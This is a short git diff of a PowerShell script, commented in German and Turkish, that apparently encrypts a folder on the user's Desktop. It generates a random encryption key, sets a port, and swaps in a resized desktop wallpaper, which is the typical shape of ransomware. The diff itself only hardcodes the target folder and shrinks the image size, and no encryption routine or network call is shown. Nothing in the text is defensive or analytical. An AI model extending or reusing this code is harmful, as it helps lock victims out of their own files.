@@ -1,8 +1,8 @@
 #wir stellen erstmal fest, welches Folder wir verschlüsseln..
 $username=$env:USERNAME
 #$hostname=mbgogo
-$folder=foo
-$folderPath = "C:\Users\$username\Desktop\$folder"
+#$folder=foo
+$folderPath = "C:\Users\$username\Desktop\foo"
 $port=8080
 $encryptionKey = New-Object Byte[] 32  
 [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)
@@ -63,8 +63,8 @@ public class Wallpaper {
 $newWallpaperPath = "C:\Users\Calculus\Downloads\gogo.png"
 
 # Yeni boyutları belirleme
-$newWidth = 1920  # Yeni genişlik (piksel cinsinden)
-$newHeight = 1080  # Yeni yükseklik (piksel cinsinden)
+$newWidth = 500  # Yeni genişlik (piksel cinsinden)
+$newHeight = 500  # Yeni yükseklik (piksel cinsinden)
 
 # Wallpaper'ı yeniden boyutlandırma
 $img = [System.Drawing.Image]::FromFile("C:\Users\Calculus\Downloads\gogo.png")
